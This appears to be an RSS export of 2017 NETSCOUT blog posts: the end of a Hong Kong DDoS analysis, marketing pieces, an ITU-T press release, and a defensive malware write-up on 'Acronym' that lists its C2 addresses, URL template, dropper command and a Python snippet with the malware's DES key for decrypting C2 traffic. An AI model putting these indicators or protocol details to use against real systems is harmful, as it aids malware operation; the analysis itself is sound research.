<p>Fifteen percent (1028) of the 6,827 reported attacks targeting Hong Kong between April 1st and April 8th contained destination IP addresses that were not anonymized. Of those, 330 were unique. Although it is a small sample, it allows us to gain some insight into the target of these attacks. Following is a Maltego graph visualizing the relationship between the 330 unique target IPs and their corresponding ASs without revealing actual IP Addresses or ASNs: [caption id="attachment_8944" align="aligncenter" width="975"]<a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic7-Maltego1-IPs_and_ASNs.png"><img alt="" class="wp-image-8944 size-full" height="829" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic7-Maltego1-IPs_and_ASNs.png" width="975" /></a> Nodal Analysis of Target IPs to ASNs. Note the lack of clustering.[/caption] As illustrated, the targeted IP Addresses are highly scattered across 52 different ASN's. Following is a Maltego graph associating the target IP addresses with domains known to have resolved to those IPs at some point during the April 1st through 8th timeframe based on pDNS information from PassiveTotal. [caption id="attachment_8943" align="aligncenter" width="975"]<a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic7-Maltego2-IPs_and_Domains.png"><img alt="" class="wp-image-8943 size-full" height="936" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Pic7-Maltego2-IPs_and_Domains.png" width="975" /></a> Nodal Analysis of Target IPs to Domains. Note the lack of Clustering.[/caption] Again, the targets are highly scattered encompassing over 500 different domains so we looked at the domains for target IP addresses that were hosting only one domain. There were 94 such cases. Of those it was possible to roughly classify half as follows: [caption id="attachment_8939" align="aligncenter" width="529"]<a href="http://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Table4-TypeOfWebPropertiesAttacked.png"><img alt="" class="wp-image-8939" height="418" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/04/KSoluk-HKDDoS-Table4-TypeOfWebPropertiesAttacked.png" width="529" /></a> Web Property Classification for Single-tenant Domains[/caption] While the online gambling sites were all casino-game oriented, the online gaming sites included lottery as well as other sites that involved a financial component based on game performance.</p>

<h2>Conclusion</h2>

<p>We know that, at a country level, Hong Kong saw a substantial and sustained increase in the number of DDoS attacks during the first 8 days of April 2017. The average attack size did not increase, just the number of attacks per day increased. We know that the attacks were largely blended in nature with UDP reflection/amplification attacks and TCP SYN attacks featuring prominently. Although China is the top source country for the attacks, the reflection/amplification attacks could have been triggered from anywhere. Based on a small sample (15%) of attacks where the destination IP addresses were not anonymized, we believe the attacks were aimed at multiple organizations given that they spanned hundreds of unique IP's across 52 different ASN's either directly or indirectly affecting over 500 different domains. Based on an analysis of a small number of single-tenant attacks, the threat actor appears to have intended to target online gambling/gaming sites during this time period. Although geopolitical motivation is often associated with country-level activity, the emergence of multiple, different gambling/gaming targets leads us to believe that DDoS extortion is the most likely motivation. As is often the case with DDoS attacks, this can result in collateral damage for co-located sites or sites that just happen to be in the cross-fire such as the two hospitals referenced above. Additionally, anomalies such as this where specific geographies or industry verticals suddenly become targeted after long periods of relative silence exemplify why companies should always utilize best practices for protecting their infrastructure, should maintain diligence, and should have trained staff that regularly conduct DDoS war games. Prepared organizations that leverage an Intelligent DDoS Mitigation System (IDMS) such as Arbor TMS or APS should have no problem mitigating these types of attacks.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/default_images/blog_thumbnail_0.png" length="58011" type="image/png"/>
    <guid isPermaLink="false">0afeb4fa-4689-489d-9680-bf58c3e6e360</guid>
    <pubDate>Sun, 23 Apr 2017 20:39:41 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title> As Cloud Becomes Retail’s Digital Middleman</title>
  <link>http://localhost:7996/blog/cloud-retail-digital-service-assurance</link>
  <description>In July 2016, you may have heard that Nordstrom acquired a minority stake in a company called DS Co. DS Co. offers supply chain software called Dsco, which acts as a digital middleman between suppliers and the retailers who sell their products.</description>
  <content:encoded><![CDATA[<p>In July 2016, you may have heard that <a href="https://www.wsj.com/articles/nordstrom-buys-stake-in-software-firm-1467970381" target="_blank">Nordstrom acquired a minority stake in a company called DS Co</a>. DS Co. offers supply chain software called Dsco, which acts as a digital middleman between suppliers and the retailers who sell their products.</p>

<p>When retailers like Nordstrom display supplier inventory, and then ask suppliers to drop ship products to customers instead of storing inventory in their own warehouses, they can offer a wider range of products while lowering shipping and inventory management costs. Nordstrom may keep the most popular color of a particular shoe style and brand to ship from its warehouse, but it can display other colors for the same shoe on its e-commerce site and drop ship other shoes directly from the supplier.</p>

<p>Nordstrom’s use of a cloud-based service acknowledges a new reality in retail: the disappearing middleman. Thanks to apps and the web, customers have global views of pricing and shipping timeframes from multiple retailers and manufacturers for the products they want. If you can cut out the middleman and automate processes to lower prices and increase order fulfillment speeds, you’re more likely to get the sale. If you can’t, you risk getting left behind in the digital economy.</p>

<p><strong>Connecting Directly to Customers</strong><br />
On one side the cloud eliminates the retail middleman, but on the other side it means relying on applications and services to assure business continuity. That includes automation that alerts human decision-makers about increased demand, both reactively and predictively, and coordination with suppliers to deal with demand spikes. It is an added level of system, software and services complexity in an industry already going through digital transformation for many years.  Retailers have been embracing digital transformation with automation in their warehouses, and within e-commerce platforms – think of the simple “Customers Who Liked This Also Bought” recommendation engine. Automating processes increases productivity and accuracy, but powering it requires an increasingly complex cloud services ecosystem.</p>

<div align="center">
<div data-embed-button="media_browser" data-entity-embed-display="view_mode:media.embedded" data-entity-type="media" data-entity-uuid="b84149bf-a329-4f62-b369-94a4fe9830e5" class="align-center embedded-entity" data-langcode="en">
  <div>
      <img width="480" height="320" alt="automation" typeof="foaf:Image" data-src="http://localhost:7996/sites/default/files/styles/large_lazy_load_480x480/public/bigstock--134406278_600x.jpg?itok=Q9amQTpZ" class="lazyload image-style-large-lazy-load-480x480" /></div>

</div>
</div>

<p> </p>

<p>The cloud does not just eliminate the middleman in warehousing and vendor relations, either. Retailers also take their messaging directly to customers through social media and mobile marketing. To compete, retailers must deliver exceptional digital experiences, improved cross-channel connections, and targeted mobile marketing. Cloud powers these services, becoming the digital middleman that must not only be always up and running, but also enable retailers to innovate with confidence.  To make that happen requires a service assurance solution to help accelerate deploying new applications and services perhaps tens or hundreds of times a day and support potentially millions of daily transactions within the cloud and on-premises IT infrastructure.</p>

<p><strong>The Death of Retail as We Know It</strong><br />
Former Walmart CEO Mike Duke said in 2012 that his biggest regret as CEO was not investing more in e-commerce to better compete with Amazon. In September 2016 Walmart spent $3 billion dollars on jet.com for their innovative pricing software and to strengthen their e-commerce infrastructure. According to <a href="https://fortune.com/2016/09/20/walmart-acquisition-jetcom/" target="_blank">Fortune</a>, Walmart has over 15 million items online and adds around 1 million a month. It came too late from Warren Buffet’s perspective: he has paired most of his stake in Walmart, a company he started to invest in 2005.  Buffet, who admits he does not know much when it comes to technology, said at his annual shareholders’ meeting in 2016 that Amazon “is a big, big force, and it has already disrupted plenty of people, and it will disrupt more.” When it comes to the digital economy Buffet thinks Amazon’s competitors “have <a href="https://finance.yahoo.com/news/warren-buffett-just-dropped-walmart-225521054.html" target="_blank">not figured the way to either participate in it or to counter it</a>.”</p>

<p>While cloud technology is table stakes for retail success, retailers are already looking at embracing IoT to further disrupt the industry. With IoT devices like <a href="https://www.accenture.com/us-en/insights/competitive-agility-index" target="_blank">iBeacons </a>and local resources for processing data, retailers can connect immediately with customers, collect and interpret data in real time and deliver personalized pricing, promotions, and recommendations. IoT enables smart shelves, smart pricing and smart shopping. But marrying IoT with cloud adds more complexity to the IT environment. Performance degradation happens, especially as more “things” (software, systems, devices) are added to the service delivery path.  Database errors, QoS misconfigurations, DNS issues, failed microservices, and a lot more can take place anywhere along the digital value chain. Getting ahead of cloud and IoT problems before they become business problems requires understanding service interdependencies and relationships, today and tomorrow.</p>

<p>Using cloud services in place of the middleman as many retailers have done puts more power in the hands of customers. At a minimum, delivering a great experience requires end-to-end availability, fast connections, and reliable data delivery. NETSCOUT can help by providing end-to-end visibility of the entire IT environment and deliver real-time, actionable intelligence.  To learn more about how NETSCOUT nGeniusONE Service Assurance platform helps deliver a seamless customer experience take a look at case studies, infographics and more at <a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="70e75c43-9e15-4ef8-a611-d3d08bf1763f" href="http://localhost:7996/voice-of-customer" title="Voice of The Customer">Voice of the Customer</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/article-enterprise-digital_middleman-1200x480.jpg" length="147626" type="image/jpeg"/>
    <guid isPermaLink="false">ceb77f7b-cc59-4d8a-9740-4d72aefa6b94</guid>
    <pubDate>Tue, 21 Mar 2017 14:14:53 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Ron Lifton</dc:creator>
    </item>
<item>
  <title>Acronym: M is for Malware</title>
  <link>http://localhost:7996/blog/asert/acronym-m-malware</link>
  <description>A malware researcher known as Antelox recently tweeted about an unknown malware sample that caught our eye. Upon further investigation, it is a modular malware known as Acronym and could possibly be associated with the Win32/Potao malware family and the Operation Potao Express campaign. This post takes a look at our analysis of Acronym thus far. Samples The sample tweeted about...</description>
  <content:encoded><![CDATA[<p>A malware researcher known as Antelox recently <a href="https://twitter.com/Antelox/status/837727636973580289/">tweeted</a> about an unknown malware sample that caught our eye. Upon further investigation, it is a modular malware known as Acronym and could possibly be associated with the Win32/Potao malware family and the Operation Potao Express campaign. This post takes a look at our analysis of Acronym thus far.</p>

<h2>Samples</h2>

<p>The sample tweeted about is available on <a href="https://www.virustotal.com/en/file/4a91289e99d3597f4c9e54a3d1d311dfb66aa92fd476463834e4d1f8df651762/analysis/">VirusTotal</a>. While searching for it in ASERT’s malware zoo we discovered that it was being dropped by another sample, also on <a href="https://www.virustotal.com/en/file/e541744893f08a52f8218cc7d4246667e5930cfb7d769f09bd42978edf9c334f/analysis/">VirusTotal</a>.</p>

<h2>Naming</h2>

<p>Acronym comes from a couple of strings in the samples. The first is a debugging string left in the dropper: C:\Users\user\Documents\Visual Studio 2012\Projects\<span style="color: #ff0000;">acronym</span>\BIN\Update.pdb The second string is from the dropped executable and uses an abbreviation of “acronym”: http://%s:%s/<span style="color: #ff0000;">acr</span>/update.php</p>

<h2>Timestamps</h2>

<p>There are multiple timestamps in the samples indicating that this sample was active starting around February 2017. The compilation dates for the dropper and dropped executable are:</p>

<ul>
	<li>2017-02-17 13:18:25</li>
	<li>2017-02-16 09:48:30</li>
</ul>

<p>In addition, in the dropped component, there are references to a “group” and a “ver” that contain date strings:</p>

<ul>
	<li>Feb01</li>
	<li>19.02.2017</li>
</ul>

<h2>Dropper Component</h2>

<p>The operation of the dropper is fairly straightforward. It starts by killing any processes named “wmpnetwk.exe” with the following command: taskkill /f /im wmpnetwk.exe Next, it creates a temporary filename where the name will start with a “HH” and ends with a “.tmp” and then moves the following file to it: C:\Documents and Settings\Admin\Application Data\Windows Media Player\wmpnetwk.exe It finishes by writing the dropped executable to the wmpnetwk.exe file path and executing it.</p>

<h2>Bot Component</h2>

<p>Acronym starts off by setting up persistence. Depending on the Windows version, it will do this by either using the typical Registry Run method or by adding a new task into the Task Scheduler. To prevent multiple copies of itself from running, it creates and checks the following mutex: sjd8anSice8h_sdnm9232 After the bot has been initialized, it will start phoning home to its command and control servers (C2s). It will iterate through six possible IP/port pairs. In the analyzed sample the six pairs were composed of two IPs and three ports:</p>

<ul>
	<li>85.143.166.244:8080</li>
	<li>85.143.166.244:443</li>
	<li>85.143.166.244:80</li>
	<li>62.76.47.198:8080</li>
	<li>62.76.47.198:443</li>
	<li>62.76.47.198:80</li>
</ul>

<p>Each IP will be formatted into a URL using the following template: http://%s:%s/acr/update.php An example phone home request looks like this:</p>

<p><img src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2017/03/phonehome-300x229.png" /></p>

<p>The POST data consists of one name/value pair where the name is five random alphanumeric characters (xrlfR in this example). The encrypted value is wrapped up in multiple layers:</p>

<ul>
	<li>URL encoded</li>
	<li>Base64 encoded</li>
	<li>DES encrypted with hardcoded key and initialization vector (IV)</li>
	<li>Bzip2 compressed</li>
</ul>

<p>It can be unwrapped with the following Python snippet:</p>

<pre>
import base64
import bz2
import urlparse
from Crypto.Cipher import DES

post_value = "TZUiUOgnyLaS8o21zJj%2B6G6kSqgMapnq4wsg4SBPgAO7yMNwB%2BykANZ0s33INSTe%0D%0Ans8Y4ZU/jZOqW1OsBORW5LvgcET6hwTnSoNxVmvb0syfWdVAoL%2BUvA5XEkkHQLHI%0D%0Aly1/uwyfL9eIgav/AfmQfrzDvTLDy0H%2BeWUhyIyHzCY%3D%0D%0A"

unquoted = urlparse.unquote(post_value)
no_b64 = base64.b64decode(unquoted)
des = DES.new("\xf1\x0e\x25\x7c\x6b\xce\x0d\x34", DES.MODE_CBC, "\x01\x02\x03\x04\x05\x06\x07\x08")
no_des = des.decrypt(no_b64)
plain = bz2.decompress(no_des)</pre>

<p>Once unwrapped it contains the following query string of name/value pairs. 3LWuJ=<span style="color: #993300;">f43b28526bbb230d</span>&amp;3LWuJ=<span style="color: #333399;">Feb01</span>&amp;3LWuJ=<span style="color: #008000;">19.02.2017</span>&amp;<span style="color: #00ff00;">5.1.2600_x32</span>&amp;<span style="color: #ff00ff;">ADMIN-B2619D2D3</span>&amp;yyamq=<span style="color: #00ccff;">?</span> The names are again random 5 alphanumeric characters, but some of the names are used more than once (possible bug). The values can be broken up into the following:</p>

<ul>
	<li><span style="color: #993300;">f43b28526bbb230d</span> – bot UID</li>
	<li><span style="color: #333399;">Feb01</span> – group</li>
	<li><span style="color: #008000;">19.02.2017</span> – ver</li>
	<li><span style="color: #00ff00;">5.1.2600_x32</span> – Windows version and architecture</li>
	<li><span style="color: #ff00ff;">ADMIN-B2619D2D3</span> – computer name</li>
	<li><span style="color: #00ccff;">?</span> – random data (possible bug)</li>
</ul>

<p>Another possible bug is that the Windows version and computer name fields are missing a name field. The bot UID is the first 16 characters of a MD5 hex digest of a string consisting of the computer name and ProcessorNameString from the Registry. “group” and “ver” are both hardcoded strings and likely refer to a campaign ID and version of the malware. At the time of writing the C2s weren’t responding so we don’t have a good visual of what a response looks like. The response data is encrypted with DES and can be decrypted using the same key and IV as above. The data maps to commands and command data. There are three built-in commands:</p>

<ul>
	<li>Take a screenshot</li>
	<li>Download and execute</li>
	<li>Run a plugin</li>
</ul>

<p>The plugin command is worth a closer look. It basically loads a DLL received from the C2 and looks for a “Scan” and/or “Plug” export function. If it finds a “Scan” export it will execute it and send the results to the C2. If it finds a “Plug” export it will start a new thread and execute the function with the following string as an argument: uid=%s&amp;group=%s&amp;ver=%s “uid”, “group”, and “ver” are filled in with the same values as in the phone home. As noted above, the C2s were down during this research so we were unable to analyze any plugins.</p>

<h2>Possible Link to Win32/Potao Malware Family</h2>

<p>Pivoting on the “Scan” and “Plug” plugin functionality led to a possible connection to the Win32/Potao malware family. As described in ESET’s “<a href="http://www.welivesecurity.com/wp-content/uploads/2015/07/Operation-Potao-Express_final_v2.pdf">Operation Potao Express: Analysis of a cyber-espionage toolkit</a>” paper, “Potao is another example of targeted espionage malware, a so-called APT…” that they’ve been tracking since 2011. With a campaign history going back multiple years, it is possible that Acronym is a new addition to the Potao gang’s “cyber-espionage toolkit”. In addition to the plugin code overlap, there is also some similarity in the way the malware uses</p>

<ul>
	<li>IPs with ports 8080, 443, and 80</li>
	<li>Shared C2 network: 62.76.x.x</li>
	<li>Temporary filenames starting with “HH”</li>
</ul>

<p>On the other hand though, there is a lot of functionality missing in Acronym that was documented in Win32/Potao. Some examples:</p>

<ul>
	<li>No decoy document used in the dropper</li>
	<li>Dropper doesn’t stored the dropped executable compressed</li>
	<li>Doesn’t inject into any processes</li>
	<li>Doesn’t drop a DLL, but an EXE</li>
	<li>No string encryption</li>
	<li>No RSA key exchange</li>
	<li>No AES encryption</li>
	<li>No XML data exchange</li>
	<li>Different system information query string</li>
	<li>No Windows API hashing</li>
</ul>

<p>There are also at least three components that looked to be copy and pasted from code examples on the Internet:</p>

<ul>
	<li>HTTP communications</li>
	<li>DES encryption and key</li>
	<li>Screenshot functionality</li>
</ul>

<p>So it is just as likely that the plugin functionality was copy and pasted from some other source and not connected to Win32/Potao and their campaign.</p>

<h2>Conclusion</h2>

<p>As usual with new malware it is too soon to assess how active and widespread this new family will become, but it does have a potential link to a long running malware campaign known as Operation Potao Express that makes it worth watching.</p>

<p>&nbsp;</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/m-clipart.png" length="26717" type="image/png"/>
    <guid isPermaLink="false">6357525d-b8a6-4cd6-97d7-7f9c23789a22</guid>
    <pubDate>Wed, 15 Mar 2017 09:00:19 -0400</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>New ITU-T Recommendation P.1203 </title>
  <link>http://localhost:7996/blog/new-itu-t-recommendation-p1203</link>
  <description>In December 2016, ITU-T SG12 approved recommendation P.1203, which describes algorithms (“models”) that estimate the end user media quality for adaptive streaming sessions. The recommendation is applicable to non-intrusive in-service quality monitoring and contributes to the development of high-quality adaptive bitrate video streaming services. By using P.1203, service...</description>
  <content:encoded><![CDATA[<p class="lead">In December 2016, ITU-T SG12 approved recommendation P.1203, which describes algorithms (“models”) that estimate the end user media quality for adaptive streaming sessions. The recommendation is applicable to non-intrusive in-service quality monitoring and contributes to the development of high-quality adaptive bitrate video streaming services. By using P.1203, service providers and network operators can now monitor the quality of their video services, and thus take actions if the targeted quality is not reached.</p>

<p>P.1203 was created jointly by seven companies: Deutsche Telekom AG (with Ilmenau University of Technology), Ericsson AB, Huawei Technologies Co., Ltd., NETSCOUT SYSTEMS, Inc., NTT Network Technology Laboratories, OPTICOM Dipl.-Ing. M. Keyhl GmbH, SwissQual AG / Rohde&amp;Schwarz GmbH &amp; Co. KG.</p>

<h5>Background</h5>

<p>Video streaming is one of the most used internet services today and adaptive bitrate streaming mechanisms are often used to balance the media delivery according to any variations in the available bandwidth. This is also important for mobile scenarios, where the bandwidth can vary due to interference and user movement. While adaptation improves the possibility of an interrupt-free delivery, it also creates quality variations in the audiovisual media which can be disturbing to the end user.</p>

<h5>About Recommendation P.1203 and Future plans</h5>

<p>The standard comprises individual models for short-term video and audio quality estimation, and a final integration model. The integration model combines the short-term outputs from the video and audio quality models into a long-term audio-visual quality estimation, and also includes the effect of stalling (freezing). The standard describes different model realizations for different levels of content encryption and computational complexity.</p>

<p>The seven participating companies submitted their initial model candidates for an ITU-T evaluation procedure. These candidate models were tested using extensive subjective data, and the best performing algorithms were finally merged into one single standard.</p>

<p>P.1203 currently supports adaptive bitrate video streaming services for H.264/AVC-encoded videos up to HD format. As a next step, in its ongoing work ITU-T is extending the standard to cover up to 4K / UHD format video, then including three video codecs, namely H.264/AVC, H.265/HEVC and VP9. More in-depth information about P.1203 can be found here:&nbsp;<a href="http://newslog.itu.int/archives/1477" target="_blank">http://newslog.itu.int/archives/1477</a>.</p>

<h6>About ITU-T SG12</h6>

<p>ITU-T SG12: The International Telecommunication Union Telecommunication Standardization Sector (ITU-T) is one of the three Sectors of the ITU. Study Group 12 (SG12) of ITU-T is responsible for Recommendations on the end-to-end transmission performance of terminals and networks, in relation to the perceived quality and acceptance by users of text, data, speech, and multimedia applications.</p>

<h6>About Deutsche Telekom AG&nbsp;</h6>

<p>Deutsche Telekom is one of the world’s leading integrated telecommunications companies, with some 156 million mobile customers, 29 million fixed-network lines, and more than 18 million broadband lines.</p>

<h6>About Ilmenau University of Technology</h6>

<p>Ilmenau University of Technology is the only technical university of the state of Thuringia in Germany, training engineers of excellent reputation since 1894. Today, the profile of our modern university includes engineering, natural sciences, business studies and media.</p>

<h6>About Ericsson AB</h6>

<p>Ericsson is a world leader in communications technology and services with headquarters in Stockholm, Sweden. Our organization consists of more than 111,000 experts who provide customers in 180 countries with innovative solutions and services. Together we are building a more connected future where anyone and any industry is empowered to reach their full potential.</p>

<h6>About Huawei Technologies Co., Ltd.</h6>

<p>Huawei is a leading global ICT solutions provider. As a responsible and robust business player, innovative information society enabler, and cooperative industry contributor, Huawei is committed to building a Better Connected World. Through our dedication to customer-centric innovation and strong partnerships, we have established end-to-end capabilities and strengths across carrier, enterprise, consumer, and cloud computing domains. Huawei’s 170,000 employees worldwide create maximum value for telecom operators, enterprises and consumers. Our innovative ICT solutions, products and services have been deployed in over 170 countries and regions, serving more than one-third of the world’s population. Founded in 1987, Huawei is a private company that is fully owned by its employees. For more information, please visit Huawei online at <a href="http://www.huawei.com">www.huawei.com</a>.</p>

<h6>About NETSCOUT SYSTEMS, Inc.</h6>

<p>NETSCOUT SYSTEMS, INC. (NASDAQ: NTCT) is a leading provider of business assurance – a powerful combination of service assurance, cybersecurity, and business intelligence solutions – for today’s most demanding service provider, enterprise and government networks. To learn more, visit <a href="http://www.netscout.com">www.netscout.com</a> or follow @NETSCOUT on Twitter, Facebook, or LinkedIn.</p>

<h6>About NTT Network Technology Laboratories</h6>

<p>NTT Network Technology Laboratories is responsible for formulating an R&amp;D strategy toward an information and communications network infrastructure of the future. For more information, please visit our website at <a href="http://www.ntt.co.jp/inlab/e/org/nt.html">www.ntt.co.jp/inlab/e/org/nt.html</a></p>

<h6>About OPTICOM&nbsp;Dipl.-Ing. M. Keyhl GmbH</h6>

<p>OPTICOM Dipl.-Ing. M. Keyhl GmbH, Erlangen, GERMANY, is a leading provider of standardized ‘perceptual measurement’ technology for Voice, Audio and Video quality assessment and licenses OEM software to T&amp;M vendors, Smartphone manufacturers, network equipment suppliers and operators worldwide. – <a href="http://www.opticom.de">www.opticom.de</a></p>

<h6>About SwissQual AG, a Rohde and Schwarz company</h6>

<p>Rohde &amp; Schwarz is a leading global supplier of mobile network testing solutions. The company’s extensive and diverse product portfolio provides sophisticated, cost-effective test solutions for mobile operators, infrastructure vendors, testing service providers, installation companies and government regulators. For more information about Rohde &amp; Schwarz mobile network testing, please visit our website at&nbsp;<a href="http://www.mobile-network-testing.com/" target="_blank">www.mobile-network-testing.com</a>.</p>
]]></content:encoded>
    <enclosure url="http://localhost:7996/sites/default/files/header-article-video-streaming-1200x675.jpg" length="317731" type="image/jpeg"/>
    <guid isPermaLink="false">e982ba98-87a7-481d-85b1-2d6eaaae2cf1</guid>
    <pubDate>Mon, 06 Mar 2017 10:19:13 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title> Accelerating Big Data Analytics</title>
  <link>http://localhost:7996/blog/accelerating-big-data-analytics</link>
  <description>The excitement of achieving business insights with a Big Data Analytics (BDA) solution that will reduce churn and increase Average Revenue per User (ARPU) often leads to unrealistic expectations before the project has even begun. The truth is that for most big data analytics projects the time from conception and sale to actual production that delivers business insights may be...</description>
  <content:encoded><![CDATA[<p>The excitement of achieving business insights with a Big Data Analytics (BDA) solution that will reduce churn and increase Average Revenue per User (ARPU) often leads to unrealistic expectations before the project has even begun. The truth is that for most big data analytics projects the time from conception and sale to actual production that delivers business insights may be as much as 18-24 months. Taking a pragmatic and practiced approach to big data analytics projects should reduce inflated expectations but will dramatically accelerate the delivery time of the working solution to drive business value in as much as half or more.</p>

<p>Value acceleration begins with an assessment of business drivers resulting in recommended use cases that deliver value. What are the business problems to be solved?  What are the desired results? Project owners have to ask and answer these important questions. A good rule of thumb here is to assess where the greatest value can be achieved quickly and then implementation of greatest value areas first. Following a familiar cliché, “don’t try to boil the ocean”, but rather find one (or two) problem areas to focus on, drive these incremental project(s) to completion, realize the value, and in the process gain experience and expertise with the BDA solution so that those learnings can be implemented on the next project, and so on, in an accelerated mode. It is important to determine how to measure business value of use cases in order to help achieve this prioritization.</p>

<p>Consistent and proven methodologies for implementing BDA projects are needed to deliver more timely and consistent results. It is the process of identifying the data and information needed to address the business challenges and questions that enables the business insights and monetization.</p>

<h3 data-fontsize="16" data-lineheight="24"><strong>Data &gt; Information &gt; Insights &gt; Monetization</strong></h3>

<p>Users need to understand the full value capability of the BDA solution and the required data inputs to support it. Can it address the business problems? Do you have the requisite data feeds? Do the data feeds contain what you need and are they timely? What reports do you need? Do you have the human resources for the project?</p>

<p>To facilitate the solution adoption, ensure rapid adoption across organizations, and realize measurable value, a five part approach is recommended that includes Training, Quickstart, Best Practices, Resident Expert and Automation.</p>

<h3 data-fontsize="16" data-lineheight="24"><img alt="training" data-entity-type="file" data-entity-uuid="b831d1e5-9769-4f9a-88e9-6ce5912c5aad" src="http://localhost:7996/sites/default/files/inline-images/training.jpg" style="margin-left:20px;" class="align-right" />Training</h3>

<p>To state the obvious users must be trained on the use of the selected BDA solution. But the training approach can be can be modified to accelerate the project. Taking a boot camp approach that gets users on keyboards using the product in the shortest amount of time (2-4 hour training sessions) will help expedite the learning process. Continued training modules are added to further system learning and expertise.</p>

<h3 data-fontsize="16" data-lineheight="24">QuickStart</h3>

<p>Getting a BDA project up and running is best accomplished by targeting a limited set of objectives and deliverables. Project owners must determine a few Key Performance Indicators (KPIs) and/or Key Quality Indicators (KQIs) to use as measurements for business value and identify a few reports to address the specific project(s).</p>

<h3 data-fontsize="16" data-lineheight="24">Best Practices</h3>

<p>There are many best practices for implementing Big Data Analytics projects but two important ones are data quality optimization and process innovation.</p>

<p>Data is the foundation for any BDA project. Without smart data you cannot have great analytics. Data quality optimization is paramount to delivering great analytics. That means following a process to assess, analyze, and optimize data quality, accuracy, availability and integrity.</p>

<p>Process Re-engineering starts with looking at the <strong>People, Processes and Systems</strong> and understanding their interdependency and optimizing.</p>

<p>For <strong>People</strong> one must define who are the users or beneficiaries of the system, how will they use the system and data and for what purpose? Companies can have strong people with strong processes but without an equally strong system operations will not scale.</p>

<p>For <strong>Process</strong> one must define how data gets managed and disseminated; how system and changes are maintained to enable continuous business decision making. Companies with strong system and strong processes but that lack strong people will results in underutilized assets and unrealized investment benefits.</p>

<p>For <strong>System</strong> one must define what data the system has, how accurate is it and what business decisions system it is capable of enabling through its functionality. Companies with strong systems and strong people but without strong processes lead to continuous manual intervention, slow response and inconsistency.</p>

<h3 data-fontsize="16" data-lineheight="24">Resident Expert</h3>

<p>To accelerate BDA projects its best to consider utilizing Professional Services resource(s) with expert knowledge of the BDA solution as well as carrier network and analytics experience. The resident expert not only helps accelerate the first project delivery but in doing so can train the project in team in best practices that can be employed furthering the learning and experienced gained and helping to accelerate the application to the next project.</p>

<h3 data-fontsize="16" data-lineheight="24">Automation</h3>

<p>Automation should start with well documented processes as that makes a successful process repeatable and extensible. Continuity audits are taken to ensure compliance with documented processes.   Assessing process readiness for business critical areas and then implement findings of audits and improve disaster readiness.</p>

<p>Following these approaches and best practices will aid in setting more realistic expectations for Big Data Analytics projects and help to accelerate the realization of value with business insights and monetization. Having access to rich, real-time, smart data that offers carrier scalability is essential to delivering valuable analytics. With increased competition and accelerating business it is has never been more urgent to realize business insights.</p>

<p><strong>To learn more about how smart data enables great analytics go to <a href="https://www.netscout.com/?ls=PR-MKTG&amp;lsd=blog-022717-1">NETSCOUT</a>.</strong></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/big-data-analytics.jpg" length="1038664" type="image/jpeg"/>
    <guid isPermaLink="false">4ef05c55-a0cf-4908-a812-019ae6e9ba5f</guid>
    <pubDate>Mon, 27 Feb 2017 10:06:47 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Change All Your Passwords, Right Now!</title>
  <link>http://localhost:7996/blog/asert/change-all-your-passwords-right-now</link>
  <description>by Steinthor Bjarnason, Senior ASERT Security Analyst &amp; Roland Dobbins, ASERT Principal Engineer CloudFlare are probably best known as a DDoS mitigation service provider, but they also operate one of the largest Content Delivery Networks (CDNs) on the Internet. Many popular Web sites, mobile apps, etc. make use of the CloudFlare CDN, which hosts content associated with more...</description>
  <content:encoded><![CDATA[<p>by Steinthor Bjarnason, <em>Senior ASERT Security Analyst</em> &amp; Roland Dobbins, <em>ASERT Principal Engineer</em></p>

<p><a href="https://en.wikipedia.org/wiki/Cloudflare" title="CloudFlare">CloudFlare</a> are probably best known as a DDoS mitigation service provider, but they also operate one of the largest <a href="http://www.webopedia.com/TERM/C/CDN.html" title="Content Delivery Network">Content Delivery Networks</a> (CDNs) on the Internet. Many popular Web sites, mobile apps, etc. make use of the CloudFlare CDN, which hosts content associated with more than 4 million DNS domains, worldwide.</p>

<p>CloudFlare have developed customized software which allows their CDN to service a huge amount of Web requests every second of every day. It’s a complex, highly-scalable system, and CloudFlare are continually working to enhance its functionality and scalability in order to meet the needs of their customers.</p>

